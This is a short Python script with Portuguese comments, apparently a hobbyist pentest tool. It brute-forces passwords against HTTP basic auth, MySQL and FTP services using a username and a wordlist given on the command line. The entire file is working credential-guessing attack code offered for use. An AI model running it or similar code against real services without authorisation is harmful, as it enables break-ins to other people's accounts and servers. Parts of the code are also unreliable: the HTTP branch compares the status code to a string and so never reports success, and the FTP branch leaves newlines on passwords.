#!/usr/bin/python
#NOVO PROGRAMA PARA A AREA DE PENTEST END HACKING
#FEITO COMO FORMA DE PASSAR TEMPO EM MEIO DO MEU TEDIO
#PODER FAZER BRUTE EM SERVICOS:
# FTP, HTTPS, MYSQL
#AUTOR:Nando
#DATA:09/02/2017
import requests
import os
import sys
import MySQLdb
import time
import ftplib


url = sys.argv[1]
usuario = sys.argv[2]
senhas=open(sys.argv[3])
tipo = sys.argv[4]

print("""
 ____  ____  _   _ _____ _____      _____ ___  ____   ____ _____
| __ )|  _ \| | | |_   _| ____|    |  ___/ _ \|  _ \ / ___| ____|
|  _ \| |_) | | | | | | |  _| _____| |_ | | | | |_) | |   |  _|
| |_) |  _ <| |_| | | | | |__|_____|  _|| |_| |  _ <| |___| |___
|____/|_| \_\\___/  |_| |_____|    |_|   \___/|_| \_\\____|_____|

""")
print("###########################################################")
print("Autor:Nando ")
print("Version: 1.0")
print("Alvo:%s "%url)
print("Tipo de Atack:%s "%tipo)
print("###########################################################")
print("")

#BRUTE FORCE EM SERVICOS HTTPS
if(tipo=='http'):
  for senha in senhas:
   senha = senha.rstrip()
   print ("Tentativa Usuario:%s / Senha:%s"%(usuario, senha))
   login = requests.get(url, auth=(usuario, senha))
   time.sleep(5) 
   print ("")
   if(login.status_code=='200'):
      print("Login/Senha Encontrado: ")
      print('usuario:%s '%usuario)
      print('senha:%s '%senha) 
#BRUTE FORCE EM SERVICOS MYSQL
if(tipo=='mysql'):
  for senha in senhas:
   try:
    senha = senha.rstrip()
    time.sleep(5)
    login  =  MySQLdb.connect(host=url, user=usuario, passwd=senha)
    print("Conexao Estabelecida!!!")
    print("Usuario:%s "%usuario)
    print("Senha:%s "%senha)    
   except:
     print("Tentativa Usuario:%s / Senha:%s"%(usuario, senha))
     print("")
#BRUTE FORCE EM SERVICOS FTP
if(tipo=='ftp'):
  for senha in senhas:
    try:
      c = ftplib.FTP(url)
      time.sleep(5)
      c.login(usuario, senha)
      print("Usuario: %s"%usuario)
      print("Senha: %s"%senha)
      print("!!! CONEXAO ESTABELECIDA !!!")
    except ftplib.error_perm:
      print("Tentativa Usuario:%s / Senha:%s "%(usuario, senha))


